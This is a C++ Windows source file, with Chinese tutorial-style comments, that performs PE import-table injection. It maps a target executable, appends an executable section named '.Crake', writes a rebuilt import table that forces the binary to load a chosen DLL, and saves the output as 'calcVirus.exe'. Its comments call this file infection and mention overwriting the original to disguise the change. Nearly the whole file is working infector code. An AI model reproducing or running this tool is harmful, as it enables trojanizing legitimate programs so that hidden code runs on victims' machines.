// NewSection.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <Windows.h>
#include <iostream>
#include <strsafe.h>

using namespace std;


// 导入表定义
typedef struct tag_IATTableContent
{
	IMAGE_THUNK_DATA OriginalThunk[2];
	IMAGE_THUNK_DATA FirstThunk[2];
	IMAGE_IMPORT_BY_NAME ImportByName;
	CHAR szFuncName[64];
	CHAR szDllName[MAX_PATH];
}IATTableContent, *LPIATTableContent;


// 这些重定义其实早就已经在windows.h中定义过了，编译成64位就可以做64位PE文件感染
// 如果是32位中想感染64位文件，那就必须写成IMAGE_NT_HEADERS64 这个样子，
// 因为编译成的是32位程序，IMAGE_NT_HEADERS会被编译成IMAGE_NT_HEADERS32。
#ifdef _WIN64
typedef IMAGE_NT_HEADERS64 IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;
typedef IMAGE_OPTIONAL_HEADER64 IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
#else
typedef IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;
typedef IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
#endif

//32 / 64 都能使用这个宏
#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
	((ULONG_PTR)(ntheader) +                                            \
	FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
	((ntheader))->FileHeader.SizeOfOptionalHeader   \
	))

//完成文件的内存映射
BOOL
MapFileOfSection(HANDLE& hFile,char* szFilePath,ULONG_PTR* ulBaseAddress);

BOOL
ModifyPEImportTableInject(HANDLE hFile,ULONG_PTR ulBaseAddress,char* szDllName);		//Dll通常不传路径，因为导入表中只有动态库的名称，放在同一目录下就可以，或者放在系统目录下都行

//判断RVA输入哪个节
PIMAGE_SECTION_HEADER
	GetEnclosingSectionHeader(ULONG_PTR rva,PIMAGE_NT_HEADERS pNTHeader);

//按粒度对齐，内存粒度或者是文件粒度
DWORD
	AligmentAddress(DWORD ulRva, DWORD dwAligment);

//得到一个节的内存抬高量
ULONG_PTR
	GetSectionMemoryIncrement(PIMAGE_SECTION_HEADER pSection);

// BOOL
// 	CreateVirusFile(HANDLE hSourceFile, ULONG_PTR ulBaseAddress);

//HANDLE g_hFile = NULL;		//文件句柄

int _tmain(int argc, _TCHAR* argv[])
{
	char szFilePath[MAX_PATH] = "D:\\Target.exe";
	char szDllName[MAX_PATH] = "D:\\Dll.dll";

	HANDLE hFile = INVALID_HANDLE_VALUE;
	ULONG_PTR ulBaseAddress = 0;	//PE文件在内存中基址
	if (!MapFileOfSection(hFile,szFilePath, &ulBaseAddress))
	{
		printf("MapFile Failed\r\n");
		return -1;
	}
	printf("BaseAddress:%p\r\n", ulBaseAddress);

	if (!ModifyPEImportTableInject(hFile,ulBaseAddress, szDllName))
	{
		printf("ModifyPEImportTable Failed\r\n");
		return -1;
	}


	CloseHandle(hFile);

	return 0;
}

BOOL
	MapFileOfSection(HANDLE& hFile,char* szFilePath, ULONG_PTR* ulBaseAddress)
{
	hFile = CreateFileA(
		szFilePath,   //文件名  
		GENERIC_READ | GENERIC_WRITE, //对文件进行读写操作  
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,  //打开已存在文件  
		FILE_ATTRIBUTE_NORMAL,
		0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Not exsit\r\n");
		return FALSE;
	}
	//返回值size_high,size_low分别表示文件大小的高32位/低32位  
	DWORD size_low, size_high;
	size_low = GetFileSize(hFile, &size_high);

	//创建文件的内存映射文件。     
	HANDLE hMapFile = CreateFileMapping(
		hFile,
		NULL,
		PAGE_READWRITE | SEC_COMMIT,  //对映射文件进行读写  
		0,
		0,			  //这两个参数共64位，所以支持的最大文件长度为16EB .这里往后申请4KB内存，为了写入新的导入表。保险起见，上面一个参数和这个参数都传0就可以。
		NULL);

	if (hMapFile == INVALID_HANDLE_VALUE)
	{
		printf("Can't create file mapping.Error%d:/n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}

	//把文件数据映射到进程的地址空间  
	void* pvFile = MapViewOfFile(
		hMapFile,
		FILE_MAP_READ | FILE_MAP_WRITE,
		0,
		0,
		0);

	if (pvFile == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMapFile);
		return FALSE;
	}

	*ulBaseAddress = (ULONG_PTR)pvFile;
	return TRUE;
}

BOOL
	ModifyPEImportTableInject(HANDLE hFile,ULONG_PTR ulBaseAddress, char* szDllName)
{
	DWORD dwWriteSize = 0;
	DWORD dwReturnSize = 0;
	DWORD dwRet = 0;
	PVOID pWriteBuffer = NULL;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)ulBaseAddress;
	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNTHeader);
	//定位到最后一个节的结束为止，就是新添加的那个节上面的那个节表，为的是初始化新节的VirtualAddress以及PointerToRawData（必须对齐）
	PIMAGE_SECTION_HEADER pLastSection = (PIMAGE_SECTION_HEADER)(section + pNTHeader->FileHeader.NumberOfSections - 1);

	//创建新文件，当然可以覆盖掉源文件造成修改文件的假象。
	HANDLE hTargetFile = CreateFileA("D:\\calcVirus.exe", FILE_ALL_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hTargetFile == INVALID_HANDLE_VALUE)
	{
		int a = GetLastError();
		printf("Create Virus Failed\r\n");
		return FALSE;
	}

	//写入Dos Header
	dwRet = WriteFile(hTargetFile, pDosHeader, sizeof(IMAGE_DOS_HEADER), &dwReturnSize, NULL);
	if (!dwRet)
	{
		printf("Write Virus DosHeader Failed\r\n");
		return FALSE;
	}

	//写入Dos Stub
	dwWriteSize = pDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER);
	dwRet = WriteFile(hTargetFile, (LPVOID)((DWORD)pDosHeader + sizeof(IMAGE_DOS_HEADER)), dwWriteSize, &dwReturnSize, NULL);
	if (!dwRet)
	{
		printf("Write Virus DosStub Failed\r\n");
		return FALSE;
	}

	//写入Nt Header
	dwWriteSize = sizeof(IMAGE_NT_HEADERS);
	dwRet = WriteFile(hTargetFile, pNTHeader, dwWriteSize, &dwReturnSize, NULL);
	if (!dwRet)
	{
		printf("Write Virus NtHeader Failed\r\n");
		return FALSE;
	}

	//Original Section Table + New Section + 0(结束标志)。没有0绝对崩溃
	//pNTHeader->FileHeader.NumberOfSections 没有把0这个结束标志算在内，所以要加2
	DWORD dwSectionSize = (pNTHeader->FileHeader.NumberOfSections + 2)*sizeof(IMAGE_SECTION_HEADER);
	PIMAGE_SECTION_HEADER pUpdatedSection = (PIMAGE_SECTION_HEADER)new char[dwSectionSize];
	memset(pUpdatedSection, 0, dwSectionSize);
	CopyMemory(pUpdatedSection, section, sizeof(IMAGE_SECTION_HEADER)*pNTHeader->FileHeader.NumberOfSections);

	//填充新节
	PIMAGE_SECTION_HEADER pNewSection = pUpdatedSection + pNTHeader->FileHeader.NumberOfSections;
	//取内存粒度，文件粒度
	DWORD dwFileAlignment = pNTHeader->OptionalHeader.FileAlignment;
	DWORD dwMemAlignment = pNTHeader->OptionalHeader.SectionAlignment;

	//New Section，后面还有一个节，防止是有数据的内存，初始化一下
	memset(pNewSection, 0, 2 * sizeof(IMAGE_SECTION_HEADER));

	char szNewSectionName[] = ".Crake";
	StringCchCopyA((char*)(pNewSection->Name), 12, szNewSectionName);

	pNewSection->PointerToRelocations = 0;
	pNewSection->PointerToLinenumbers = 0;
	pNewSection->NumberOfRelocations = 0;
	pNewSection->NumberOfLinenumbers = 0;
	pNewSection->Characteristics = 0xE0000040;	//这个节的访问属性，0xE0000040表示“可读可写可执行，包含未初始化的数据”，试试其他的标志位，90%会出问题。
	pNewSection->VirtualAddress = AligmentAddress(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwMemAlignment);
	pNewSection->PointerToRawData = AligmentAddress(pLastSection->PointerToRawData + pLastSection->SizeOfRawData, dwFileAlignment);

	//计算空白区域，如果写入节表项造成节表的文件偏移，那么就要对原先的节表进行逐一修正。
	//第一个节表的偏移跟 PE文件头部（Dos + DosStub + NtHeader + SectionHeader）大小做比较
	DWORD dwMiniPointer = 0;
	DWORD dwSizeDelta = 0;
	BOOL  bNeedModify = FALSE;
	for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++)
	{
		if (pUpdatedSection[i].Name)
		{
			if (0 == dwMiniPointer)
				dwMiniPointer = (DWORD)(pUpdatedSection[i].PointerToRawData);
			if ((pUpdatedSection[i].PointerToRawData) < dwMiniPointer)
				dwMiniPointer = (DWORD)pUpdatedSection[i].PointerToRawData;
		}
	}

	//写入文件的PE头部的总大小，可能会造成全部节表的文件偏移的抬高
	//这种情况发生在第一个节的文件偏移 小于 新写入PE头部的总大小 的时候
	//如果发生了，操作也很简单，保留一些空白区域以满足文件粒度，还有别忘了要更新节表的文件偏移
	//值得注意的是，对文件的操作基本上不用到VirtualAddress，只有在算地址的时候才用到RVA
	DWORD dwTmp = (pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + dwSectionSize);

	//写入的PE头在预计范围内就不需要对节表的文件偏移进行修正
	if (dwMiniPointer >= dwTmp)
		dwSizeDelta = dwMiniPointer - dwTmp;
	//写入的PE头超出了预计范围内就需要对节表的文件偏移进行修正
	else
	{
		// 比如说，文件粒度20，写入的PE头部总大小25，这个时候超出了预计范围就要修正，但是由于粒度的原因，后面要留够一定字节，这里就是 20 - 25 % 20 = 15 ----> 25+15 = 40
		// 如果正好是整数倍就不做任何处理。比如像 PE头部总大小为40，文件粒度20.
		dwSizeDelta = dwTmp % (pNTHeader->OptionalHeader.FileAlignment);
		if (dwSizeDelta != 0)
			dwSizeDelta = pNTHeader->OptionalHeader.FileAlignment - dwSizeDelta;
		else dwSizeDelta = 0;

		//指示每个节表的文件偏移需要重新计算
		bNeedModify = TRUE;
	}

	BYTE* pDelta = new BYTE[dwSizeDelta];
	memset(pDelta, 0, dwSizeDelta);
	dwMiniPointer = dwTmp;
	dwMiniPointer += dwSizeDelta;

	if (bNeedModify)
	{
		for (int i = 0; i < (UINT)(pNTHeader->FileHeader.NumberOfSections + 1); i++)
		{
			if (0 != i)
				pUpdatedSection[i].PointerToRawData =
				pUpdatedSection[i - 1].PointerToRawData +
				pUpdatedSection[i - 1].SizeOfRawData;
			else
				pUpdatedSection[i].PointerToRawData = dwMiniPointer;
		}
	}

	//写入节表 （Original + New + 0）
	WriteFile(hTargetFile, pUpdatedSection, dwSectionSize, &dwReturnSize, NULL);
	//写入空白数据 （满足文件粒度）
	WriteFile(hTargetFile, pDelta, dwSizeDelta, &dwReturnSize, NULL);

	//写入块的内容
	for (int i = 0; i < (UINT)(pNTHeader->FileHeader.NumberOfSections); i++)
	{
		//SizeOfRawData 文件是按照这个值对齐的 VirtualSize反而是真实大小。这个一定要理解
		//就算是内存映射PE之后，整个节的大小也是SizeOfRawData，但是实际有数据的大小是VirtualSize。此处不理解一定要停。
		WriteFile(hTargetFile, (LPVOID)(ulBaseAddress + section[i].PointerToRawData), section[i].SizeOfRawData, &dwReturnSize, NULL);
	}

	// Copy Import_Table to NewSection
	PIMAGE_IMPORT_DESCRIPTOR  pImportDesc = 0;
	PIMAGE_SECTION_HEADER     pSection = 0;
	PIMAGE_THUNK_DATA         pThunk, pThunkIAT = 0;
	ULONG_PTR				  Offset = -1;

	//获得导入表所在的节对应的节表
	pSection = GetEnclosingSectionHeader(
		pNTHeader->OptionalHeader.DataDirectory
		[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
		pNTHeader);

	if (!pSection)
	{
		fprintf(stderr, "No Import Table../n");
		return -1;
	}

	//当前节的内存抬高值，注意每个节的内存抬高值可能不一样，所以在操作其他节的时候，此值需要更新。
	Offset = GetSectionMemoryIncrement(pSection);	

	pImportDesc =
		(PIMAGE_IMPORT_DESCRIPTOR)(pNTHeader->OptionalHeader.DataDirectory
		[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress - Offset + ulBaseAddress);

	// 取出导入的DLL的个数
	int nImportDllCount = 0;
	while (1)
	{
		if ((pImportDesc->TimeDateStamp == 0) && (pImportDesc->Name == 0))
			break;
		pThunk = (PIMAGE_THUNK_DATA)(pImportDesc->Characteristics);
		pThunkIAT = (PIMAGE_THUNK_DATA)(pImportDesc->FirstThunk);

		if (pThunk == 0 && pThunkIAT == 0)
			return -1;

		nImportDllCount++;
		pImportDesc++;
	}

	// 恢复pImportDesc的值,方便下面的复制当前导入表的操作.
	pImportDesc -= nImportDllCount;

	//一个导入表项是20字节，加上一个新结构体和一个0结束结构体。就是要写入文件的导入表的大小
	DWORD dwEndOfRawDataAddr = pNewSection->VirtualAddress;
	DWORD dwIATDESCSize = (nImportDllCount + 2) * 20;	

	PIMAGE_IMPORT_DESCRIPTOR pImportDescVector =
		(PIMAGE_IMPORT_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwIATDESCSize);
	if (pImportDescVector == NULL)
	{
		printf("HeapAlloc() failed. --err: %d/n", GetLastError());
		return -1;
	}
	memset(pImportDescVector, 0, dwIATDESCSize);
	CopyMemory(pImportDescVector + 1, pImportDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR) * (nImportDllCount + 1));	//New + Original[nImportDllCount] + 0;

	//每个节所在的内存文件偏移可能不一样
	Offset = GetSectionMemoryIncrement(pNewSection);		

	//构造新表项要用到的数据项
	//注意一下，PE32和PE64导入表的不同之处就体现在IMAGE_THUNK_DATA这个结构，这个结构实际上只包含一个4/8字节的偏移（是共用体）
	IATTableContent iatTableContent = {0};
	iatTableContent.FirstThunk[0].u1.AddressOfData = offsetof(IATTableContent, ImportByName);
	iatTableContent.OriginalThunk[0].u1.AddressOfData = offsetof(IATTableContent, ImportByName);

	StringCchCopyA(iatTableContent.szDllName, MAX_PATH, szDllName);
	StringCchCopyA((char*)(iatTableContent.ImportByName.Name), 64, "HelloShine");	//Dll中写一个按名称导出的导出函数，如果没有导出函数，检验应该是会出错的。
	iatTableContent.ImportByName.Hint = 0;

	pImportDescVector->FirstThunk = (LONG_PTR)pNewSection->VirtualAddress + dwIATDESCSize + offsetof(IATTableContent, FirstThunk);
	pImportDescVector->OriginalFirstThunk = (LONG_PTR)pNewSection->VirtualAddress + dwIATDESCSize + offsetof(IATTableContent, OriginalThunk);
	pImportDescVector->Name = (LONG_PTR)pNewSection->VirtualAddress + dwIATDESCSize + offsetof(IATTableContent, szDllName);
	pImportDescVector->TimeDateStamp = -1;	//时间戳，看书，主要是针对绑定输入表的。
	pImportDescVector->ForwarderChain = -1;	//转引值，看书，了解这个值是干什么的。

	iatTableContent.FirstThunk[0].u1.AddressOfData = (LONG_PTR)pNewSection->VirtualAddress + dwIATDESCSize + offsetof(IATTableContent, ImportByName);
	iatTableContent.OriginalThunk[0].u1.AddressOfData = (LONG_PTR)pNewSection->VirtualAddress + dwIATDESCSize + offsetof(IATTableContent, ImportByName);


	// 在新节上写入新的导入表内容
	DWORD dwRetSize = 0;
	DWORD lDistanceToMove = pNewSection->PointerToRawData;

	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);
	WriteFile(hTargetFile, pImportDescVector, dwIATDESCSize, &dwRetSize, NULL);
	WriteFile(hTargetFile, &iatTableContent, sizeof(IATTableContent), &dwRetSize, NULL);

	DWORD dwBytesWritten = 0;
	DWORD dwBuffer = pNewSection->VirtualAddress;


	// 修改IMAGE_DIRECTOR_ENTRY_IMPORT中VirtualAddress的地址,
	// 使其指向新的导入表的位置
	int nRet = 0;
	lDistanceToMove = (long)&(pNTHeader->OptionalHeader.DataDirectory
		[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) - ulBaseAddress;

	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);

	printf("OrigEntryImport: %x\r\n", pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	nRet = WriteFile(hTargetFile, (PVOID)&dwBuffer, 4, &dwBytesWritten, NULL);
	if (!nRet)
	{
		printf("WriteFile(ENTRY_IMPORT) failed. --err: %d\r\n", GetLastError());
		return FALSE;
	}
	printf("NewEntryImport: %x\r\n", dwBuffer);

	// 修改导入表长度
	nRet = WriteFile(hTargetFile, (PVOID)&dwIATDESCSize, 4, &dwBytesWritten, NULL);
	if (!nRet)
	{
		printf("WriteFile(Entry_import.size) failed. --err: %d\n", GetLastError());
		return FALSE;
	}


	pNewSection = section + pNTHeader->FileHeader.NumberOfSections;

	//PE一些值需要修正，这些值不修正，运行的时候会报“不是有效的win32程序”，可以尝试看看效果。
	//PE文件大小重造
	lDistanceToMove = (ULONG_PTR)(&(pNTHeader->OptionalHeader.SizeOfImage)) - ulBaseAddress;
	dwBuffer = pNTHeader->OptionalHeader.SizeOfImage + 0x1000;
	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);
	WriteFile(hTargetFile, (PVOID)&dwBuffer, 4, &dwBytesWritten, NULL);

	//PE节大小重造
	lDistanceToMove = (ULONG_PTR)(&(pNTHeader->FileHeader.NumberOfSections)) - ulBaseAddress;
	dwBuffer = pNTHeader->FileHeader.NumberOfSections + 1;
	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);
	WriteFile(hTargetFile, (PVOID)&dwBuffer, 4, &dwBytesWritten, NULL);

	//PE头大小重造
	lDistanceToMove = (ULONG_PTR)(&(pNTHeader->OptionalHeader.SizeOfHeaders)) - ulBaseAddress;
	dwBuffer = pNTHeader->OptionalHeader.SizeOfHeaders + 2*sizeof(IMAGE_SECTION_HEADER);
	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);
	WriteFile(hTargetFile, (PVOID)&dwBuffer, 4, &dwBytesWritten, NULL);

	//新节实际大小重造
	lDistanceToMove = (ULONG_PTR)(&(pNewSection->Misc.VirtualSize)) - ulBaseAddress;
	dwBuffer = dwIATDESCSize + sizeof(IATTableContent);
	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);
	WriteFile(hTargetFile, (PVOID)&dwBuffer, 4, &dwBytesWritten, NULL);

	//新节粒度大小重造，由于是最后一个节了，后面也没补上0数据完成对齐，所以这个值就跟实际大小一样了。可以改进下
	lDistanceToMove = (ULONG_PTR)(&(pNewSection->SizeOfRawData)) - ulBaseAddress;
	dwBuffer = dwIATDESCSize + sizeof(IATTableContent);
	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);
	WriteFile(hTargetFile, (PVOID)&dwBuffer, 4, &dwBytesWritten, NULL);

	//最后，对于很多系统文件，像什么calc.exe notepad.exe存在绑定输入表
	//这些内容存在于PE文件头之后，第一个节之前的那段空白区，我们在写入新文件的时候并没有写入这部分的数据，是按0填充的
	//因此，这里必须要将绑定输入表的RVA，Size置成0。不过一般而言自己用vs编译的exe都不带绑定输入表的。

	lDistanceToMove = (ULONG_PTR)(&(pNTHeader->OptionalHeader.DataDirectory
		[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)) - ulBaseAddress;
	ULONG64 uZeroEightBit = 0;
	SetFilePointer(hTargetFile, lDistanceToMove, NULL, FILE_BEGIN);
	WriteFile(hTargetFile, (PVOID)&uZeroEightBit, 8, &dwBytesWritten, NULL);

	//释放内存，完成操作，别忘了之前的文件映射都还没释放。
	HeapFree(GetProcessHeap(), 0, pImportDescVector);
	CloseHandle(hTargetFile);

	return TRUE;
}


//
// Copy from Matt Pietrek
// Given an RVA, look up the section header that encloses it and return a
// pointer to its IMAGE_SECTION_HEADER
//
PIMAGE_SECTION_HEADER
	GetEnclosingSectionHeader(
	ULONG_PTR rva,
	PIMAGE_NT_HEADERS pNTHeader
	)
{
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNTHeader);
	unsigned i;

	for (i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++, section++)
	{
		// Is the RVA within this section?
		if ((rva >= section->VirtualAddress) &&
			(rva < (section->VirtualAddress + section->Misc.VirtualSize)))
			return section;
	}

	return 0;
}


//注意这个函数，如果ulRva正好是dwAligment的倍数的时候，会返回这个倍数加1的dwAligment大小
//所以，这个地方要不要判断是不是他的倍数，因人而异。
DWORD
	AligmentAddress(DWORD ulRva, DWORD dwAligment)
{
	if (ulRva % dwAligment == 0)
		return ulRva;
	else
		return (ulRva / dwAligment + 1)*dwAligment;
}

ULONG_PTR
	GetSectionMemoryIncrement(PIMAGE_SECTION_HEADER pSection)
{
	if (!pSection)
		return NULL;
	else
		return (pSection->VirtualAddress - pSection->PointerToRawData);
}